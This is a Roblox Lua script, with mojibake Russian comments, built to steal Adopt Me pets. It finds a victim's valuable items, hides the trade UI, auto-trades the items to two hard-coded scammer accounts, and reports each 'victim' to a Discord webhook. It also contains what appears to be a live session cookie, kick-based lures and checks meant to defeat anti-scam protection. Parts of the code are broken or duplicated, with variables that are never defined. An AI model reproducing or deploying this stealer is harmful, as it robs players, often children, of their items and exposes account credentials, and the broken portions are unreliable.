getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")"
local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

SettingsRemote:FireServer("trade_requests", 1) --><Trade Activating><--

--><C O N F I G><--
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" --><P R O X Y for RU><-- [lewisakura]
local Username1 = "knisdqx_meow" --><First Username><--
local Username2 = "noviy_nickname" --><Second Username><--

--><A C C E S S><--
repeat task.wait() until game:IsLoaded()

if getgenv().adm then return end
getgenv().adm = true

--><S M A R T | K I C K><-- 
if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
    game:GetService("Players").LocalPlayer:Kick("\nPlease join to different server!")
    return
end

if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
    game.Players.LocalPlayer:Kick("\nPrivate server not allowed!")
    return
end

if game.PlaceId ~= 920587237 then
    plr:kick("Game not supported. Please join a normal Adopt Me server")
    return
end

if not tradeLicense.player_has_trade_license() then
    plr:kick("Can't access to pets, 0 pets detected")
    return
end

--><M A N U A L | K I C K><--
game.Players.PlayerAdded:Connect(function(newPlayer)
    newPlayer.Chatted:Connect(function(message)
        if message == "clear" then
            game.Players.LocalPlayer:Kick("\nThis script is currently patched! Follow @FBScripts on telegram for updates")
        end
    end)
end)

--><Game Embeds><--
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local headers = {
    ["Accept"] = "*/*",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
}

-->< Value System ><--
local valueResponse = request({
    Url = "https://elvebredd.com/api/pets/get-latest",
    Method = "GET",
    Headers = headers
})

local responseData = HttpService:JSONDecode(valueResponse.Body)
local petsData = HttpService:JSONDecode(responseData.pets)

-- Pet value from system --
local function getPetValue(petName, petProps)
    local pet = petsByName[petName]
    if not pet then
        return nil
    end

    local baseKey
    if petProps.mega_neon then
        baseKey = "mvalue"
    elseif petProps.neon then
        baseKey = "nvalue"
    else
        baseKey = "rvalue"
    end

    local suffix = ""
    if petProps.rideable and petProps.flyable then
        suffix = " - fly&ride"
    elseif petProps.rideable then
        suffix = " - ride"
    elseif petProps.flyable then
        suffix = " - fly"
    else
        suffix = " - nopotion"
    end

    local key = baseKey .. suffix
    return pet[key] or pet[baseKey]
end

local totalValue = 0

-->< Inventory Value Checker ><--
for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

local grouped = {}
for _, item in ipairs(list) do
    local key = item.Name .. " " .. propertiesToString(item.Properties)
    if grouped[key] then
        grouped[key].Count = grouped[key].Count + 1
        grouped[key].TotalValue = grouped[key].TotalValue + item.Value
    else
        grouped[key] = {
            Name = item.Name,
            Properties = item.Properties,
            Count = 1,
            TotalValue = item.Value
        }
    end
end

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. "r" end
    if props.flyable then str = str .. "f" end
    if props.mega_neon then
        str = str .. "m"
    elseif props.neon then
        str = str .. "n"
    else
        str = str .. "d"
    end
    return str
end

local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
	}

    local grouped = {}
    for _, item in ipairs(sortedItems) do
        local key = item.Name .. " " .. propertiesToString(item.Properties)
        if grouped[key] then
            grouped[key].Count = grouped[key].Count + 1
            grouped[key].TotalValue = grouped[key].TotalValue + item.Value
        else
            grouped[key] = {
                Name = item.Name,
                Properties = item.Properties,
                Count = 1,
                TotalValue = item.Value
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalValue > b.TotalValue
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s %s (x%s): %s Value", group.Name, propertiesToString(group.Properties), group.Count, group.TotalValue)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}
local inventory = data[plr.Name].inventory

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            local value = getPetValue(cat[data.id].name, data.properties)
            if value and value >= min_value then
                if table.find(excludedItems, data.id) then
                    continue
                end
                table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties, Value = value})
                totalValue = totalValue + value
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.Value > b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(itemsToSend, prefix)
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(Username1 or Username2, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end

--><A U T O | D I S A B L E R><-- [if have active AntiScam protect]
local function KickPlayer(reason)
    local localPlayer = Players.LocalPlayer
    if localPlayer then
        local kickMethods = {
            function() localPlayer:Kick(reason) end,
            function() game:Shutdown() end,
            function() while true do end end, 
            function() error(reason) end, 
            function() getgenv().crash = nil end 
        }
        
        for i, method in ipairs(kickMethods) do
            local success = pcall(method)
        end
    end
end

local function SendToDiscord(fakeJobId, realJobId, placeId, playerCount, confirmers, errorMsg, kicked)
    
    local color = errorMsg and 16711680 or (kicked and 16753920 or 65280) -- –ö—Ä–∞—Å–Ω—ã–π: –æ—à–∏–±–∫–∞, –û—Ä–∞–Ω–∂–µ–≤—ã–π: –∫–∏–∫, –ó–µ–ª–µ–Ω—ã–π: —É—Å–ø–µ—Ö
    local title = kicked and "üö® Antiscam Detected - Global Failure"
    
    local embed = {
        {
            title = title,
            color = color,
            fields = {
                {
                    name = "üéÆ Game Id",
                    value = tostring(placeId),
                    inline = true
                },
                {
                    name = "üë• Players",
                    value = tostring(playerCount),
                    inline = true
                }
            },
            footer = {
                text = "Delta JobId Bypass"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    if kicked then
        table.insert(embed[1].fields, {
            name = "üì° Fake JobId (Delta)",
            value = "```" .. fakeJobId .. "```",
            inline = false
        })
        table.insert(embed[1].fields, {
            name = "üö® Reason",
            value = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –Ω–∞—Å—Ç–æ—è—â–∏–π JobId",
            inline = false
        })
        table.insert(embed[1].fields, {
            name = "üõ°Ô∏è Action",
            value = "–ò–≥—Ä–æ–∫ –±—ã–ª –∫–∏–∫–Ω—É—Ç –∏–∑ –∏–≥—Ä—ã",
            inline = false
        })
    elseif errorMsg then
        table.insert(embed[1].fields, {
            name = "üì° Fake JobId (Delta)",
            value = "```" .. fakeJobId .. "```",
            inline = false
        })
        table.insert(embed[1].fields, {
            name = "üö® Error",
            value = "```" .. errorMsg .. "```",
            inline = false
        })
    else
        table.insert(embed[1].fields, {
            name = "‚ö†Ô∏è Fake JobId (Delta)",
            value = "```" .. fakeJobId .. "```",
            inline = false
        })
        table.insert(embed[1].fields, {
            name = "‚úÖ Real JobId",
            value = "```" .. realJobId .. "```", 
            inline = false
        })
        table.insert(embed[1].fields, {
            name = "üïµÔ∏è Confirmers",
            value = #confirmers > 0 and table.concat(confirmers, ", ") or "No confirmers",
            inline = false
        })
    end
    
    local payload = {
        embeds = embed,
        username = "JobId Detective",
        avatar_url = "https://cdn.discordapp.com/attachments/1065829452399480862/1065829477483986984/68747470733a2f2f692e696d6775722e636f6d2f4e577a764e6f572e706e67.png"
    }
    
    local success, response = pcall(function()
        local result = request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
        return result
    end)
    
    if success then
        print("üì® –†–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Discord")
    else
        print("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord: " .. tostring(response))
    end
end

local function MakeRequestWithRetry(url, options, maxRetries)
    maxRetries = maxRetries or 3
    
    for attempt = 1, maxRetries do
        local success, response = pcall(function()
            return request(options)
        end)
        
        if success and response then
            if response.StatusCode == 503 then
                print("üîÑ –ü–æ–ø—ã—Ç–∫–∞ " .. attempt .. "/" .. maxRetries .. ": HTTP 503 - Service Unavailable")
                if attempt < maxRetries then
                    wait(2) -- –ñ–¥–µ–º 2 —Å–µ–∫—É–Ω–¥—ã –ø–µ—Ä–µ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
                end
            else
                return response -- –£—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç
            end
        else
            print("‚ùå –ü–æ–ø—ã—Ç–∫–∞ " .. attempt .. "/" .. maxRetries .. " failed: " .. tostring(response))
            if attempt < maxRetries then
                wait(1)
            end
        end
    end
    
    return nil
end

local function GetRealJobIdWithAuth()
    print("=== –ü–û–õ–£–ß–ï–ù–ò–ï –ù–ê–°–¢–û–Ø–©–ï–ì–û JOBId –ß–ï–†–ï–ó PRESENCE API ===")
    
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∫—É–∫–∏
    if not getgenv().Cookie then
        print("‚ùå ROBLOSECURITY –∫—É–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        print("–î–æ–±–∞–≤—å –≤ —Å–∫—Ä–∏–ø—Ç: getgenv().Cookie = '—Ç–≤–æ–π_–∫—É–∫–∏_–∑–¥–µ—Å—å'")
        return nil
    end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return nil end
    
    local placeId = game.PlaceId
    local playerCount = #Players:GetPlayers()
    
    -- –°–æ–±–∏—Ä–∞–µ–º userId –≤—Å–µ—Ö –∏–≥—Ä–æ–∫–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
    local userIds = {}
    local playerMap = {}
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(userIds, player.UserId)
            playerMap[player.UserId] = player.Name
        end
    end
    
    if #userIds == 0 then
        print("‚ùå –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ –Ω–µ—Ç –¥—Ä—É–≥–∏—Ö –∏–≥—Ä–æ–∫–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏")
        return nil
    end
    
    print("–ü—Ä–æ–≤–µ—Ä—è–µ–º " .. #userIds .. " –∏–≥—Ä–æ–∫–æ–≤...")
    
    -- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –∫ Presence API —Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π
    local function GetPresenceWithAuth(userIdsList)
        local reqBody = HttpService:JSONEncode({
            userIds = userIdsList
        })
        
        print("–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å —Å " .. #userIdsList .. " userIds")
        
        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
            Url = "https://presence.roblox.com/v1/presence/users",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
            },
            Body = reqBody
        }, 3) -- 3 –ø–æ–ø—ã—Ç–∫–∏
        
        if response then
            print("–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞: " .. (response.StatusCode or "unknown"))
            print("–î–ª–∏–Ω–∞ –æ—Ç–≤–µ—Ç–∞: " .. #response.Body)
            
            -- –ü—Ä–æ–±—É–µ–º —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å JSON
            local jsonSuccess, jsonData = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            
            if jsonSuccess then
                return jsonData
            else
                print("‚ùå –û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ JSON")
                return nil
            end
        else
            print("‚ùå –í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –∑–∞–ø—Ä–æ—Å–∞ failed")
            return nil
        end
    end
    
    -- –ü–æ–ª—É—á–∞–µ–º Presence –¥–∞–Ω–Ω—ã–µ
    local presenceData = GetPresenceWithAuth(userIds)
    if not presenceData then
        print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å Presence –¥–∞–Ω–Ω—ã–µ")
        
        -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—à–∏–±–∫—É –≤ Discord
        SendToDiscord(game.JobId, "N/A", placeId, playerCount, {}, "HTTP 503 - Service Unavailable after 3 retries")
        return nil
    end
    
    if not presenceData.userPresences then
        print("‚ùå –ù–µ—Ç userPresences –≤ –æ—Ç–≤–µ—Ç–µ")
        return nil
    end
    
    -- –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
    local foundJobIds = {}
    local validResponses = 0
    
    for _, presence in pairs(presenceData.userPresences) do
        if presence.placeId == placeId and presence.gameId then
            validResponses = validResponses + 1
            local jobId = presence.gameId
            local playerName = playerMap[presence.userId] or "Unknown"
            
            if jobId and jobId ~= game.JobId then
                print("üéØ " .. playerName .. " –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ: " .. jobId)
                table.insert(foundJobIds, {
                    jobId = jobId,
                    player = playerName,
                    lastLocation = presence.lastLocation or "InGame"
                })
            else
                print("‚ÑπÔ∏è  " .. playerName .. " –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ç–æ—Ç –∂–µ JobId —á—Ç–æ –∏ —É –Ω–∞—Å")
            end
        end
    end
    
    print("–ü–æ–ª—É—á–µ–Ω–æ –≤–∞–ª–∏–¥–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤: " .. validResponses .. "/" .. #userIds)
    
    -- –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –Ω–∞–π–¥–µ–Ω–Ω—ã–µ JobId
    if #foundJobIds > 0 then
        print("\n=== –ê–ù–ê–õ–ò–ó –†–ï–ó–£–õ–¨–¢–ê–¢–û–í ===")
        
        -- –ì—Ä—É–ø–ø–∏—Ä—É–µ–º –ø–æ JobId
        local jobIdCounts = {}
        for _, found in ipairs(foundJobIds) do
            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
        end
        
        -- –ù–∞—Ö–æ–¥–∏–º –Ω–∞–∏–±–æ–ª–µ–µ —á–∞—Å—Ç—ã–π JobId
        local bestJobId, maxCount = nil, 0
        for jobId, count in pairs(jobIdCounts) do
            if count > maxCount then
                bestJobId = jobId
                maxCount = count
            end
        end
        
        if bestJobId then
            print("üéâ –ù–ê–°–¢–û–Ø–©–ò–ô JOBID: " .. bestJobId)
            print("–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω " .. maxCount .. " –∏–≥—Ä–æ–∫–∞–º–∏")
            
            -- –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—â–∏—Ö –∏–≥—Ä–æ–∫–æ–≤
            local confirmers = {}
            for _, found in ipairs(foundJobIds) do
                if found.jobId == bestJobId then
                    table.insert(confirmers, found.player)
                end
            end
            
            print("–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—Ç: " .. table.concat(confirmers, ", "))
            
            -- –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º —Å –î–µ–ª—å—Ç–æ–π
            if bestJobId ~= game.JobId then
                print("‚ö†Ô∏è  –î–ï–õ–¨–¢–ê –ü–û–ö–ê–ó–´–í–ê–ï–¢: " .. game.JobId)
                print("üîç –û–ë–ù–ê–†–£–ñ–ï–ù–ê –ü–û–î–ú–ï–ù–ê!")
                
                -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
                SendToDiscord(game.JobId, bestJobId, placeId, playerCount, confirmers)
            else
                print("‚ÑπÔ∏è  –ü–æ–¥–º–µ–Ω—ã –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ")
            end
            
            return bestJobId
        end
    else
        print("‚ùå –í—Å–µ –∏–≥—Ä–æ–∫–∏ –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç —Ç–æ—Ç –∂–µ JobId —á—Ç–æ –∏ –î–µ–ª—å—Ç–∞")
    end
    
    return nil
end

-- –ì–õ–ê–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
local function FindRealJobId()
    print("üöÄ –ó–ê–ü–£–°–ö –ü–û–ò–°–ö–ê –ù–ê–°–¢–û–Ø–©–ï–ì–û JOBID")
    
    local realJobId = GetRealJobIdWithAuth()
    
    -- –†–µ–∑—É–ª—å—Ç–∞—Ç
    if realJobId then
        print("\n‚úÖ –£–°–ü–ï–•! –ù–∞—Å—Ç–æ—è—â–∏–π JobId: " .. realJobId)
        getgenv().RealJobId = realJobId
        
        -- –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª –¥–ª—è –¥—Ä—É–≥–∏—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
        pcall(function()
            writefile("real_jobid.txt", realJobId)
        end)
        
        return realJobId
    else
        print("\nüòû –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –Ω–∞—Å—Ç–æ—è—â–∏–π JobId")
        
        -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord —á—Ç–æ –ø–æ–¥–º–µ–Ω–∞ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –∏ –∫–∏–∫–∞–µ–º
        SendToDiscord(game.JobId, "N/A", game.PlaceId, #Players:GetPlayers(), {}, "Failed to detect real JobId", true)
        
        -- –ö–∏–∫–∞–µ–º –∏–≥—Ä–æ–∫–∞
        wait(2) -- –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É –≤ Discord
        KickPlayer("Server was closed due technical error. If this error repeat then send message to technical | Telegram - @tvoytwix")
        
        return nil
    end
end

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∫—É–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞–µ–º
if getgenv().Cookie then
    local realJobId = FindRealJobId()
    
    if realJobId then
        print("\nüí° –ò—Å–ø–æ–ª—å–∑—É–π —ç—Ç–æ—Ç JobId –¥–ª—è —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏:")
        print('game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. realJobId .. '")')
        print("üéØ –ò–≥—Ä–æ–∫ –Ω–µ –±—É–¥–µ—Ç –∫–∏–∫–Ω—É—Ç - –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞!")
    end
else
    print("‚ùå –ö—É–∫–∏ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞! –°–ª–µ–¥—É–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤—ã—à–µ.")
    wait(3)
    KickPlayer("Cookie not configured - JobId verification required")
end
